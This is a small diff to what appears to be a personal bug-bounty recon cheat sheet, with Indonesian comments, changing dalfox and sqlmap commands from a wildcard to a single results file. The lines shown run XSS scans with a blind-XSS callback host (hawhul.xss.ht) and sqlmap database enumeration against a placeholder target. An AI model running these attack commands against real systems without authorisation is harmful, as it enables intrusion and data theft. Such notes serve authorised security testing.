@@ -40,8 +40,8 @@ paramspider -l subs-active.txt
 
 # XSS
 dalfox url http://target.com/index.php?cat=FUZZ -b hawhul.xss.ht -o dalfoxes.txt
-dalfox file results/*.txt -b hawhul.xss.ht -o dalfoxes.txt # GA BISA WILDCARD(*) WOE, HARUS SEBUT SATU-SATU FILE NYA
+dalfox file results/params.txt -b hawhul.xss.ht -o dalfoxes.txt # GA BISA WILDCARD(*) WOE, HARUS SEBUT SATU-SATU FILE NYA
 
 # SQLi - WIP lagi riset outputnya
 sqlmap -u target.com/index.php?par=1 --dbs --batch
-sqlmap -m results/*.txt --dbs --batch
+sqlmap -m results/params.txt --dbs --batch
